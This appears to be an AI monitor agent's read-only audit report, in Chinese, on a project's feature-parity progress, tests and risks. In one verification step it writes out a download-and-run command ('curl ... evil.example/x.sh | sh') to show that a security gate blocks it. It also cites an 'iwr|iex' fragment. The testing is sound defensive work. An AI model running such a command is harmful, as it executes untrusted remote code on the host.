# 对标进度报告

**更新时间**：2026-10-28 12:05（本机实测时钟，只读取证）
**本轮轮次**：**N = 8**
**性质**：只读核对。未修改任何代码 / research / MATRIX / ROADMAP 文件；未装依赖；未启动后端；未跑会改状态或真发请求的命令。
**基准**：Hermes Agent runtime 0.21.0-cn.18 · **目标仓**：Orbit `E:\bbbooottt`（HEAD `5c7d534`；**轮初工作树干净，轮末出现 4 个未跟踪新文件，见 R1**）

---

## 总体完成度

### **112 / 181 项 = 61.9%**

| 项 | 说明 |
|---|---|
| 权威口径 | **读「状态」列**（第 5 个 `\|` 段），且**先替换转义竖线 `\|` 再切段** |
| 完成 / 部分 / 未开始 | **✅ 112 · 🟡 45 · ⬜ 24**（112+45+24 = 181 ✓ **总数对得上**） |
| 与 `matrix_stats --check` 一致性 | 工具输出「181 项 · ✅112 · 🟡45 · ⬜24（61.9%）」exit 0 —— **与我独立解析逐字一致** ✅ |
| 格式合法性 | 我另跑一遍校验：**181 行状态列全部合法**，且**没有任何一行出现第二个状态符号**（上轮 10.1 的污染已清除） |

> **上轮我报的两个缺陷，你这轮修得比我的建议更彻底**：
> 1. `status_of()` 现在**先替掉 `\|` 再切段**（`matrix_stats.py:52-53`）——这正是 **5.9 / 5.10 被静默漏掉**的根因（`iwr\|iex` 把状态列右移一格读成 `'W13'`）。我上轮只发现了"整行包含"那一层，**没发现转义竖线这第二层**；你能抓出来是对的。
> 2. `status_column_problems()`（`:76`）实现了两条门禁，docstring 还**逐字记录了我的措辞如何污染了 10.1**（`:17-18`）。这是把教训写进代码而不是写进聊天记录——比修 bug 本身更有价值。

### 硬口径

| 你的口径 | 我的实测 | 判定 |
|---|---|---|
| `REGISTRY` 81 顶层 / 364 二级 / 39 三级 = 484 | **81 / 364 / 39 = 484** | ✅ 一致 |
| done 255 / partial 22 / todo 207 | **255 / 22 / 207**（合计 484 ✓） | ✅ 一致 |
| pytest 1 failed, 2043 passed, 1 skipped | **1 failed / 2043 passed / 1 skipped（191.15s）** | ✅ 一致（你 183.24s） |
| 唯一失败 = 既有 `test_connectors::test_browser_append_and_reload` | 正是它 | ✅ 一致 |
| ruff `All checks passed!` | **All checks passed!**（exit 0） | ✅ 一致 |
| `matrix_stats --check` 181 · ✅112 · 🟡45 · ⬜24 exit 0 | **完全一致**，exit 0 | ✅ 一致 |
| mypy **120** files clean | **122 files，2 errors**（都在 `metrics_schema.py`） | ⚠️ **见 R1：差异来自轮中落地的未跟踪文件，已提交树仍 clean** |

---

## 分层完成度

（状态列口径，转义竖线已处理）

| 层 | 完成/总数 | 百分比 | 状态 |
|---|---|---|---|
| L1 入口 / CLI | 10 / 18 | 55.6% | 🟡5、⬜3 |
| **L2 Agent 核心循环** | **6 / 10** | **60.0%** | **本轮从 ✅1 → ✅6**（🟡3、⬜1） |
| **L3 上下文装配** | **8 / 8** | **100%** | **✅ 仍完整，未被本轮改动破坏** |
| L4 模型适配 | 6 / 13 | 46.2% | 🟡4、⬜3 |
| L5 工具层 | 13 / 19 | 68.4% | 本轮 +2（🟡4、⬜2） |
| L6 工具集 / 注册 | 3 / 5 | 60.0% | 🟡2 |
| L7 Skill / curator | 13 / 18 | 72.2% | 本轮 +4（🟡3、⬜2） |
| L8 MCP | 6 / 10 | 60.0% | 🟡2、⬜2 |
| L9 记忆层 | 8 / 16 | 50.0% | 🟡3、⬜5 ← **剩余最大块** |
| L10 持久化 / 会话 | 9 / 15 | 60.0% | 本轮 +4（🟡5、⬜1） |
| L11 cron | 3 / 6 | 50.0% | 🟡2、⬜1 |
| L12 Gateway / 多平台 | 7 / 11 | 63.6% | 🟡3、⬜1 |
| L13 插件 | 5 / 10 | 50.0% | 🟡4、⬜1 |
| L14 安全 / 审批 | 6 / 10 | 60.0% | 🟡4、⬜0 |
| L15 可观测性 | 4 / 6 | 66.7% | ⬜2 |
| L16 Web UI / 前端 | 5 / 6 | 83.3% | 🟡1 |
| **合计** | **112 / 181** | **61.9%** | — |

**L3 = 8/8 = 100% 仍完整** ✅（你让我顺手确认的那条：未破坏）。
**L2 从 10% → 60%**，是本轮涨幅最大的一层，也是我上轮建议的直接结果。

---

## 本轮抽查证据

**抽样率**：本轮 15 条转 ✅ 中**复核 11 条（73%）**；两处披露 **全部复核**；`test_graph` 竞态更正 **独立复现**。

### A. 你点名的 7 条，逐条判定

**① 10.12 双 FTS5 → ✅✅ 独立库、不动 schema、选表策略与代码一致**

```
session_index.py:1     """会话检索的双 FTS5 索引：独立 ``fts.sqlite``，中文与英文各走一条路。"""
session_index.py:15-16 1. 在 app.sqlite 里加 FTS5 虚表 + 触发器 → **改 schema，禁改区**；
                       2. 另开 <data_dir>/fts.sqlite，由本模块**主动**增量同步。
session_index.py:79    #: 索引库文件名（与 app.sqlite 同级，但**完全独立**）。
session_index.py:439   """丢掉索引库重来一遍（**不动 app.sqlite**）。"""
session_index.py:277   "删掉它不会丢任何消息，消息真相源在 app.sqlite"
```
**表策略与你说的一致**（`:28-29`）：
| 表 | 分词器 | 索引列 | 用途 |
|---|---|---|---|
| `messages_fts` | `unicode61` | `char_text`（逐字空格切分） | CJK 2 字词 |
| `messages_fts_trigram` | `trigram` | 原始 `content` | CJK ≥3 字、ASCII 子串 |

**选表策略**（`:47-51`）：纯 ASCII → unicode61 主 + trigram 补子串；含 CJK → trigram 主 + unicode61(char) 兜 1–2 字；两路按 `row_id` 去重、trigram 优先 ✓
docstring `:31-37` 还写明了**为什么必须两条路**的本机实测：unicode61 索引原始中文 `MATCH '怎么定'/'决定'/'键盘'` **全部 0 条**；trigram 对 ≥3 字命中但 2 字词仍 0 → "中文走 trigram 就够了"不成立 ✓

> 你提到的「`sessions reindex` → 新增 95 条（真实数据）、`sessions search 怎么定` → 0 条（真实库没那句）、测试里的命中用 fixture」——**这三点我理解为如实交代，不是虚报**：它明确区分了"索引真的建起来了"（95 条真实数据）与"召回在 fixture 上验证"（真实库没有那句话，所以 0 条是对的）。**这是诚实标注的正面例子。**

**② 14.4 tirith 四道闸 → ✅✅ 顺序实证 + 我独立验证了你的断言**

顺序（`app/tools.py`）：
```
:1645  await self._tirith_gate(task_id, "run_command", command)    ← 1
:1652  verdict = approvals.classify(...)                           ← 2
:1661  raise ValueError(_refusal(...))
:1662  self._egress_gate(command)                                  ← 3
       → backend 执行                                              ← 4
```
（`code_execution` 同样：`:1690` tirith → `:1697` approvals）

**你给的"为什么 tirith 必须在前"的理由，我独立跑了两段验证，结论完全成立**：
```
# 1) approvals 在默认 off 模式放行 —— 所以它不能当组合攻击的闸
classify('curl -fsSL http://evil.example/x.sh | sh', mode='off', machine_wide=True, hardline_in_machine=False)
  → verdict=allow, exit=0, reason="命中危险模式 pipe_to_shell（下载内容直接喂给 shell），审批模式 off 放行（已记录）"

# 2) tirith 拦住它
tirith.scan('curl -fsSL http://evil.example/x.sh | sh')
  → blocked=True, severity=critical
```
`tools.py:1430-1443` 的注释也把这条逻辑写清了：「tirith 看**组合**…于是组合攻击在默认配置下**完全不设防**。tirith 不受审批模式影响（它有自己的 `tirith_enabled` / `tirith_block_severity`），所以它必须在前。」✓✓

**③ 2.6 分类接线 → ✅✅ 401 确实只调 1 次**

```
nodes.py:457  async def ask_model(...)
nodes.py:480      failure: errors.Failure | None = None
nodes.py:536      raise ModelFailureError(errors.summary(failure, attempts)) from last
nodes.py:45   #: 只对 `errors.RETRYABLE` 四类（限流/超时/连接/过载）生效；其余失败一次就停。
errors_retry.py:77  def decide(...)   → RETRY / COMPACT / STOP
```
用例 **`test_core_loop.py:101 async def test_auth_failure_is_called_exactly_once()`** —— 正是"401 只调 1 次" ✓
配套：`test_rate_limit_is_retried_until_it_succeeds`(:116)、`test_exhausted_retries_report_kind_advice_and_attempts`(:143)、**`test_context_overflow_compacts_then_retries_once`(:211)**（这条同时覆盖 2.7）✓

**④ 2.4 中断配对 → ✅✅ 断言就是你要的那条**

```python
async def test_interrupted_execute_still_returns_one_result_per_call():   # test_core_loop.py:284
    """中断的**唯一**合法出口是"每个调用都给一条结果"——不是抛异常、不是跳过。"""
    ...
    # 核心不变量：tool_calls 条数 == ToolMessage 条数。
    assert tool_calls == len(tool_messages) == 2
    assert retry.missing_tool_results(merged) == []
```
✓✓ 精确命中。配套 `test_repair_fills_missing_tool_results`(:271)、`test_interrupted_result_has_the_documented_shape`(:264)、`test_interrupted_thread_does_not_call_the_model_again`(:311)。

**⑤ 5.17 code_execution 子进程 → ✅✅ 断言 `os.getpid()`**

```
code_exec.py:125  return [sys.executable, "-c", code]
code_exec.py:178  process = subprocess.Popen(  # noqa: S603 - argv 是显式列表，不经 shell
```
用例 **`test_code_exec.py:42 test_code_never_runs_in_the_host_process`**：
```python
result = code_exec.run_code("import os; print(os.getpid(), flush=True); os._exit(0)")
assert int(result.stdout.strip()) != os.getpid()
```
✓✓（比"pid 不变"更强：子进程 pid 与宿主**不同**，且子进程里 `os._exit` 不会带走宿主）
配套 `test_timeout_kills_the_whole_process_tree`(:103)、`test_execute_goes_through_tirith`(:196)、`test_execute_goes_through_the_hardline_approvals`(:183)。

**⑥ 10.5 内容寻址 → ⚠️ 机制 ✅ / 那个数字 ❌ 复现不出来（你的怀疑是对的）**

**机制部分完全成立**：`PromptStore` 在 `app/session_archive.py:256`（不是 `system_prompts.py`）：
```
:257  """``system_prompts`` 的 Orbit 版：``sha256`` → 文件，任务只记 hash。"""
:282  """存一份提示词正文，返回 sha256。**同一内容只落一份文件**。"""
:290  digest = hashlib.sha256(data).hexdigest()
:45   read 时重算 sha256，不符就抛 PromptMismatch
```
`session_plane.py:71-72` 也有对应的事件记账说明 ✓

**但「本机 Hermes 数据实测：27 会话 → 22 份，894,988 → 717,973 字节，省 5 份 / 177,015 字节」我复现不出来。**
我用**只读**方式（`mode=ro&immutable=1`）直接查本机 Hermes 的 `state.db`：

| 指标 | MATRIX 写的 | 我实测 |
|---|---|---|
| 有 system_prompt 的会话 | 27 | **64** |
| 去重后唯一提示词 | 22 | **46** |
| 逐会话合计 | 894,988 字节 | **2,505,095 字节** |
| 去重后 | 717,973 字节 | **1,858,947 字节** |
| 省下 | 5 份 / 177,015 字节 | **18 份 / 646,148 字节** |

（该数字**算术自洽**：894,988 − 717,973 = 177,015、27 − 22 = 5，所以不是随手编的；但**与现库不符**——可能是子agent 用了某个更窄的口径（比如只看带 hash 列的、或某个时间窗），而那个口径没写下来。）

**判定：这个数字目前不构成独立证据。** 建议三选一：① 把子agent 用的确切查询写进证据栏；② 直接换成可复现的 646,148 / 18 份；③ **删掉数字、只留机制**——机制那半是代码可查的，本来就不需要这个数字撑。

**⑦ L7 的 7.6 / 7.12 / 7.14 / 7.17 → ✅✅ 四条全部精确**

| 条目 | 实测 |
|---|---|
| **7.6** 12 条规则 | `skill_lint.RULES` = **12**，severity 分布 **`{'error': 2, 'warning': 10}`** ✓✓ 正是 2 ERROR + 10 WARNING |
| **7.12** quarantine | `skill_hub.py:35`「放行条件写死为**零 critical**（`GUARD_CRITICAL`）。high/medium 只记录」；`:37-38`「`release()` **不能绕过 critical**（重扫一次，仍 critical 就仍然拒绝）」✓✓ |
| **7.14** bundles | `bundles.py`：`Bundle`(:68) / `Bundles`(:119) / `ReloadReport`(:109) / `BundlesError`(:59) —— 真实现，不是空登记 ✓ |
| **7.17** journey | `journey.py:29`「（旁注 + 墓碑标记），**绝不回写 `.usage.json` 或 ledger**」；`:36`「`.usage.json` 与 ledger **一个字节都不动**」✓✓ |

### B. 你的两处主动交代 —— 都复核成立

**① `session_extra` 导入顺序 → ✅ 你的表述与 `__init__.py` 现状完全一致**

`app/cli/commands/__init__.py` 现在是三组：
```python
from app.cli.commands import (...)          # isort: split   ← 第一组：真实现，含 setup
# ── 第二组：**必须在表组装之后**导入的模块 ──
from app.cli.commands import (
    hermes_parity,   # noqa: F401
    session_extra,   # noqa: E402,F401
)
from app.cli.commands.tools_extra2 import mark_proxy_paths_partial  # noqa: E402
```
注释里**逐字写着你的规则**：「**替换顶层命令的模块必须排在 `hermes_parity` 之前；只往已有父节点挂子命令的模块可以排在之后**。这是唯一一个"之后"的例子。」
**行为验证**：`setup` 正常注册（`handler=run_setup`、`subcommands=0`、`state=done`），**没有** `命令重复登记：setup` —— 我这一整轮跑的每一条 `orbit` 命令都没报这个错，说明 CLI 起得来 ✓

**② `egress` 6 条被校正为 `partial` → ✅ 精确对上**

`orbit egress` 共 13 子命令，实测状态：
| partial（6 条，iron-proxy 生命周期） | done（7 条） |
|---|---|
| `install` `start` `stop` `restart` `reload` `disable` | `setup` `status` `config` `policy` `allow` `deny` `check` |

`__init__.py` 里那段状态校正的注释也把理由写清了：「只是'如实报告 Orbit 没有这一层'，功能本身没实现。但 `Spec.build()` 见到有 handler 就标 `done`，于是'如实说没有'被算成'有'。」✓✓

> **你点出的这类虚报值得单独立一条规矩**：「**如实说没有 ≠ 有**」。它比"没做却说做了"更隐蔽，因为命令确实有输出、exit code 也可能是 0。**我下轮开始会专门抽查这一类**：凡是 `done` 的命令，都要看它的输出是"真的做了"还是"解释为什么没做"。

### C. `test_graph` 竞态更正 —— **我第 3–7 轮的判断是错的，本轮更正**

`app/agent.py` 里现在有明确记录：
```
:324  async def enqueue(self, task_id: str, resume: dict | None = None):
:327      为什么不能直接 `return`（原来的写法）：任务进入 `WAITING_USER` 时，状态…
:330      此时 `task_id in self.current` 仍为真，那次 enqueue 会被**静默丢弃**：
:332      （`tests/test_graph.py::test_ask_user_still_interrupts_and_resumes` 偶发挂死）。
:339      deferred = asyncio.create_task(self._enqueue_after(job, task_id, resume))
:351  async def _enqueue_after(self, job, task_id, resume):   → await self.enqueue(...)
```
**代码注释直接点名了那条用例**，修复是"延后到当前 job 结束后再 enqueue"。

**独立复现**：我把该用例隔离连跑 3 次 → **1 passed in 4.21s / 3.73s / 3.16s**，全部通过，且比第 6 轮我测到的 5.70s 更快。

**更正记录**：我在第 3 / 5 / 6 / 7 轮反复把 `test_ask_user_still_interrupts_and_resumes` 的偶发挂死记为「**负载敏感、非回归**」。**这个判断是错的**——它是 `WAITING_USER` 窗口内 `enqueue` 静默丢弃 resume 的**竞态**。我当时依据的是"隔离跑必过"，但**竞态同样会表现为"隔离跑必过、并发跑偶发挂"**，所以"隔离通过"不能用来排除竞态。这是我这 8 轮里最实质的一次误判，已在本报告更正。

---

## 与目标标志的差距

### Top 10 未完成项

| # | 未完成项 | 现状 | 量级 |
|---|---|---|---|
| 1 | **L9 记忆层（5 ⬜ + 3 🟡）** | **剩余最大块**：USER.md 用量自曝头、8 个外部 provider（`available()` 恒 False）、holographic、写入门禁、漂移防护 | 8 条 |
| 2 | **L4 模型适配（3 ⬜ + 4 🟡）** | `proxy` / `egress` / 三级能力元数据 / TTS-STT；🟡 里 4.1 只 16/48 profile、4.2 只 3 transport、4.9 只 4/18 槽位 | 7 条 |
| 3 | **L1 入口（3 ⬜ + 5 🟡）** | `serve` / `desktop` / `gui` / `acp`；🟡 里全局 23 flag 与二级/三级实现率 | 8 条 |
| 4 | **L5 工具剩余（2 ⬜ + 4 🟡）** | 缺媒体生成、视觉、TTS、kanban、cronjob、桌面窗口、协作消息、HomeAssistant | 差 65 个工具 |
| 5 | **L7 剩余（2 ⬜ + 3 🟡）** | hub 远端索引、sync 三方合并、`skills_guard` 107 条威胁模式 | 5 条 |
| 6 | **L13 插件（1 ⬜ + 4 🟡）** | dashboard 插件契约、懒发现、`all`/`pack` CLI | 5 条 |
| 7 | **L10 持久化（1 ⬜ + 5 🟡）** | 🟡 集中在 10.1（写侧未统一）、10.4（压缩阈值）、10.9（非影子 git）、10.11（无 schema_version 表）、10.13（19 子命令实现 8） | 6 条 |
| 8 | **L2 核心循环（1 ⬜ + 3 🟡）** | 心跳判卡死、swarm 调度、后台学习回路 | 4 条 |
| 9 | **L8 MCP（2 ⬜ + 2 🟡）** | OAuth 真流程、optional-mcps 63 模板、schema 缓存 | 4 条 |
| 10 | **L15 可观测性（2 ⬜）** | metrics schema（**轮中在飞**）、observability exporter 插件 | 2 条 |

---

## 风险与漂移

### R1 🟠 **轮中工作树被破坏：4 个未跟踪文件在 11:58 落地，导致我的 mypy 读数与你的不同**

- **轮初** `git status --porcelain` 为空 ✓（与你说的一致）
- **轮末** 出现 4 个未跟踪文件：`app/metrics_schema.py`（mtime **11:58:01**）、`app/exporters.py`、`app/cli/commands/observability_extra.py`、`tests/test_observability_export.py` —— **有人在我巡检期间开始写 W12 剩余部分**
- 后果：`mypy` 我读到 **122 files / 2 errors**，而你读到 **120 files / clean**。两个错误**全部落在未跟踪的 `metrics_schema.py`**（`:49` 与 `:63`，都是 `_check(isinstance(x, str) and x, ...)` 让 mypy 推出 `Literal[False] | str`）：
```
app\metrics_schema.py:49: error: Argument 1 to "_check" has incompatible type "Literal[False] | str"; expected "bool"
app\metrics_schema.py:63: error: ... 同上
Found 2 errors in 1 file (checked 122 source files)
```
- **判定：不是已提交代码的回归**（120 + 2 个新 app 文件 = 122，数字完全对得上）。**已提交树 mypy 仍 clean。**
- **教训（对我自己）**：基线要在**轮末再确认一次 `git status`**，不能只在轮初看一次。本轮我第一眼看到干净就默认了，直到跑 mypy 发现文件数不对才回头查——**如果我只报"mypy 2 errors"而不查 git，就会误报一次回归**。
- **轮末复查（写完本报告后再次 `git status`）**：条目从 4 涨到 **6**，新增 ` M backend/app/cli/commands/__init__.py`（**有人正在把 W12 的命令注册进去**）与 ` M PROGRESS.md`（本报告自身）。→ **在飞施工仍在继续**，下一轮开头 `REGISTRY` 数字很可能又变（顶层 81 可能涨）。**本报告的所有硬口径均以 `HEAD 5c7d534` 的已提交状态为准。**

### R2 🟡 **10.5 的「177,015 字节」不可复现（见 A⑥）**

机制成立、算术自洽，但**与本机 Hermes 现库不符**（我实测 646,148 字节 / 18 份）。目前**不构成独立证据**。建议换数字或补查询口径。

### R3 🟡 **L2 的计数：你说 ✅6/🟡2/⬜1（=9），我实测 ✅6/🟡3/⬜1（=10）**

总数 10 条，你的三个数字加起来是 9 —— **少算了 1 条 🟡**。以我实测为准：**L2 = ✅6 · 🟡3 · ⬜1**。

### R4 🟡 **未验证项（如实标注）**

| 项 | 为什么没验 |
|---|---|
| 10.12 的 `sessions reindex` / `sessions search` 实跑 | 会写 `fts.sqlite` → 未运行；只核了代码与 docstring 里的本机实测记录 |
| 8.6 心跳宽限秒数与退避序列 | 只核到机制与常量引用（连续 3 轮如此） |
| 9.15 / 14.6 / 14.10 等未抽查的新 ✅ | 本轮 15 条转 ✅ 中复核 11 条 |
| `orbit chat` 交互、`gateway start`、`cron run`、`backup create/restore`、`config edit`、`doctor --fix/--live` | 会改状态或真发请求 → 未运行 |
| `matrix_stats.py` 的重复编号端到端 exit 1 | 只读固定 MATRIX.md、无路径参数（第 4 轮起一直如此） |

### R5 🟢 **上轮建议全部落地（记录以免重复提）**

| 上轮建议 | 本轮实测 |
|---|---|
| 修 `count()` 读状态列 | ✅ 已修，且**多修了一层**（转义竖线） |
| 加两条格式门禁 | ✅ `status_column_problems()` 已实现，docstring 记录成因 |
| 清掉 10.1 的「变 ✅」污染 | ✅ 已改「可转 done」，全表无第二个符号 |
| 给 2.6/2.7 补接线点 | ✅ MATRIX 已写；L2 从 ✅1 → ✅6 |

---

## 下一轮建议

按优先级：

1. **【P0】把 R1 的教训固化成流程**：基线三件套改成「轮初 `git status` → 跑全量 → **轮末再 `git status`**」，三者不一致时以"已跟踪文件"为准重算。本轮我差点把在飞文件的 mypy 错误报成回归。
2. **【P0】处理 10.5 的 177,015 数字**（R2）：换成可复现的 **646,148 字节 / 18 份**（附我用的只读查询），或删掉数字只留机制。**这是本轮唯一一条"引用了不可复现数字"的 ✅**，而它的机制本身是硬的，改一下就行。
3. **【P0】立一条"如实说没有 ≠ 有"的抽查规则**（你提的那条）：凡是 `done` 的命令，验证输出是"真的做了"还是"解释为什么没做"。本轮 egress 6 条已修，建议在 `matrix_stats` 里加一条启发式——**扫描 `done` 命令的输出文案里是否含「未实现 / 没有这一层 / 尚未支持」**，命中就报警。
4. **【P1】L9 记忆层是剩余最大块（5 ⬜ + 3 🟡，8 条）**：且缺的多是**可离线验证、测试好写**的（USER.md 用量头、写入门禁、漂移防护、CJK 已由 10.12 的 `fts.sqlite` 铺好路）。Orbit 已有 memories 表 + USER.md 底座，比新开层便宜。
5. **【P1】L4 的 4 条 🟡 值得一次性收口**：4.1（16/48 profile）、4.2（3/5 transport）、4.9（4/18 槽位）、4.4 已 ✅。**加 profile 是纯数据活**（照 06 调研的表抄），性价比高于写新逻辑。
6. **【P2】10.1 该决断了**（🟡 已挂 3 轮）：要么让 cron/gateway/agent 的写入过 plane（变 ✅），要么把条目判据改成"统一读视图"、把"同库同表"降为差异说明。现在它挂着 🟡，且**它的证据栏里不能再出现 ✅ 字样**（门禁已防，但措辞上还是容易踩）。
7. **【P2】把"轮中在飞文件"做成可见状态**：建议在 `matrix_stats.py` 里加一行「未跟踪文件 N 个（可能影响 mypy/测试读数）」的提示。本轮若有这行，我一眼就能看出 mypy 差异的来源。
8. **【P2】复核 `08` 的「15 条已声明未消费」剩余 13 条**：连续 6 轮未核。本轮顺带看到 `nodes.py:139 context_meta.setdefault("compressed", {})` 仍是空占位——正是那 15 条之一。

---

*本报告由 monitor 角色只读生成。本轮 15 条转 ✅ 复核 11 条（73%），你点名的 7 条里 **6 条完全撑得住、1 条（10.5）机制成立但引用的数字不可复现**；两处披露**全部复核成立**；`test_graph` 竞态**我更正了自己第 3–7 轮的误判**（"负载敏感"→"竞态，已修复"）。未验证项单列，不混进完成项。*
